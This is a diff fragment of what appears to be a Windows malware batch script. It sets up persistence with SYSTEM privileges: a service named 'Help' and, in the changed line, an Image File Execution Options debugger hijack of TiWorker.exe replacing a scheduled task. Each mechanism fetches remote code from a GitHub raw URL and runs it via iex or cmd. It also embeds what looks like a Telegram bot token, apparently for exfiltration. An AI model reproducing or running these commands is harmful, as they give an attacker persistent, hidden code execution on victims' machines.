@@ -20,7 +20,7 @@ for %a in (%processList%) do (
 )
 
 sc create Help binPath="cmd.exe /c powershell.exe irm https://raw.githubusercontent.com/pushop/0/0/1/run.ps1 ^| iex" start="auto" obj="LocalSystem"
-schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc minute /mo 40 /tn "\Windows\Help" /tr "cmd.exe /c curl.exe -s https://raw.githubusercontent.com/pushop/0/0/1/ps | cmd /Q /V:ON" /F
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TiWorker.exe" /v Debugger /t REG_SZ /d "cmd /c curl.exe -s https://raw.githubusercontent.com/pushop/0/0/1/ps | cmd /V:ON" /f
 
 chcp 65001 >nul
 set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
